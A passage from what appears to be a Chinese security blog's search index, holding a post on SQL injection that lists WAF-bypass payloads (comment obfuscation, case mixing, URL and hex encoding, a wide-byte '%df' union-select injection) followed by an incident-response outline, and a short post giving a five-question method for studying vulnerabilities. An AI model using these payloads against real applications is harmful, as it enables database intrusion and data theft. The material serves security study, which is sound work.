注释符变换</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/union/**/select/**/1,2,3#</span><br><span class="hljs-string">1&#x27;</span><span class="hljs-comment">/*!union*/</span><span class="hljs-comment">/*!select*/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><h3 id="2-大小写混淆"><a href="#2-大小写混淆" class="headerlink" title="2. 大小写混淆"></a>2. 大小写混淆</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; UnIoN/**/SeLeCt 1,2,3#</span><br></code></pre></td></tr></table></figure><h3 id="3-编码转换"><a href="#3-编码转换" class="headerlink" title="3. 编码转换"></a>3. 编码转换</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%20union%20select%201,2,3%23</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0x31</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x33</span>#<br></code></pre></td></tr></table></figure><h3 id="4-等价替换"><a href="#4-等价替换" class="headerlink" title="4. 等价替换"></a>4. 等价替换</h3><ul><li>字符串函数替换</li><li>条件语句变形</li><li>注释符置换</li></ul><h2 id="防御绕过"><a href="#防御绕过" class="headerlink" title="防御绕过"></a>防御绕过</h2><h3 id="1-二次注入"><a href="#1-二次注入" class="headerlink" title="1. 二次注入"></a>1. 二次注入</h3><ul><li>存储型注入</li><li>二次编码</li><li>延迟触发</li></ul><h3 id="2-宽字节注入"><a href="#2-宽字节注入" class="headerlink" title="2. 宽字节注入"></a>2. 宽字节注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; union select 1,2,3#</span><br></code></pre></td></tr></table></figure><h3 id="3-特殊技术"><a href="#3-特殊技术" class="headerlink" title="3. 特殊技术"></a>3. 特殊技术</h3><ul><li>堆叠注入</li><li>缓冲区溢出</li><li>特殊字符</li></ul><h1 id="应急处置"><a href="#应急处置" class="headerlink" title="应急处置"></a>应急处置</h1><h2 id="入侵检测"><a href="#入侵检测" class="headerlink" title="入侵检测"></a>入侵检测</h2><ol><li><p>日志分析</p><ul><li>Web访问日志</li><li>数据库日志</li><li>系统日志</li></ul></li><li><p>漏洞确认</p><ul><li>代码审计</li><li>渗透测试</li><li>风险评估</li></ul></li></ol><h2 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h2><ol><li><p>阻断攻击</p><ul><li>部署WAF</li><li>加固配置</li><li>限制访问</li></ul></li><li><p>溯源分析</p><ul><li>攻击路径</li><li>影响评估</li><li>证据保全</li></ul></li><li><p>修复加固</p><ul><li>代码修复</li><li>配置优化</li><li>补丁更新</li></ul></li></ol><h2 id="复盘总结"><a href="#复盘总结" class="headerlink" title="复盘总结"></a>复盘总结</h2><ol><li>原因分析</li><li>完善防御</li><li>更新策略</li><li>培训教育</li></ol>]]></content>
    
    
    <categories>
      
      <category>渗透与防御</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NO.1 必看⭐️漏洞分析自测框架</title>
    <link href="/2025/02/04/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%A1%86%E6%9E%B6/"/>
    <url>/2025/02/04/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<p>学习新漏洞时，可以通过问自己这五个问题来检验是否真正掌握了它。如果能够完整回答这些问题，那就说明你已经真正掌握了这个漏洞！</p><span id="more"></span><h2 id="漏洞分析五步法"><a href="#漏洞分析五步法" class="headerlink" title="漏洞分析五步法"></a>漏洞分析五步法</h2><ol><li><p><strong>漏洞的发生原因是什么？定义是什么？</strong></p></li><li><p><strong>怎么确定是否存在这个漏洞？怎么发现这种漏洞？</strong></p></li><li><p><strong>漏洞会造成什么危害？</strong></p></li><li><p><strong>如何防御和修复这种漏洞？</strong></p></li><li><p><strong>有防御措施的情况下，怎么规避这种漏洞？</strong></p></li></ol><blockquote><p>📝 使用建议：建议你在学习每个漏洞时都按照这个顺序思考。理解原理，找到特征，评估危害，掌握防御，考虑绕过 —— 这就是完整的漏洞分析思路。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>渗透与防御</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习方法</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
